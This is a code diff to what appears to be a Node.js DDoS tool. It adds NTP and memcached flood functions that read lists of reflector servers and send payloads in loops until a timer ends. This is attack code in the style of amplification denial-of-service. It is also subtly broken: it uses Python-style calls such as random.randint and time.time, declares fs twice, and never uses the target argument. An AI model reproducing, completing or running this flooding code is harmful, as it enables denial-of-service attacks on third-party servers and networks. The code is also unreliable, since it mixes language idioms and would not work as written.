@@ -5,6 +5,10 @@ const readline = require('readline')
 const url = require('url')
 const fs = require('fs')
 const axios = require('axios')
+const net = require('net');
+const random = require('random');
+const fs = require('fs');
+const time = require('time');
 const path = require('path')
 const version = '5.1.7'
 let processList = [];
@@ -127,6 +131,60 @@ async function bootup() {
     console.log(`Are You Online?`)
   }
 }
+
+const ntp_payload = "\x17\x00\x03\x2a" + "\x00".repeat(4);
+const mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
+
+function NTP(target, port, timer) {
+  try {
+    const ntp_servers = fs.readFileSync('ntpServers.txt', 'utf8').split('\n');
+    const packets = random.randint(10, 150);
+    const server = random.choice(ntp_servers).trim();
+
+    while (time.time() < timer) {
+      try {
+        const packet = Buffer.from(`${ntp_payload}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`);
+        const client = net.createConnection({ port: port, host: server });
+        client.on('connect', () => {
+          for (let i = 0; i < packets; i++) {
+            client.write(packet);
+          }
+          client.end();
+        });
+      } catch (e) {
+        //console.log(`Erro: ${e}`);
+      }
+    }
+  } catch (e) {
+    //console.log(`Erro: ${e}`);
+  }
+}
+
+function MEM(target, port, timer) {
+  try {
+    const memsv = fs.readFileSync('memsv.txt', 'utf8').split('\n');
+    const packets = random.randint(1024, 60000);
+    const server = random.choice(memsv).trim();
+
+    while (time.time() < timer) {
+      try {
+        const packet = Buffer.from(mem_payload);
+        const client = net.createConnection({ port: 11211, host: server });
+        client.on('connect', () => {
+          for (let i = 0; i < packets; i++) {
+            client.write(packet);
+          }
+          client.end();
+        });
+      } catch (e) {
+        //console.log(`Erro: ${e}`);
+      }
+    }
+  } catch (e) {
+    //console.log(`Erro: ${e}`);
+  }
+}
+
 // [========================================] //
 async function killWifi() {
 const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
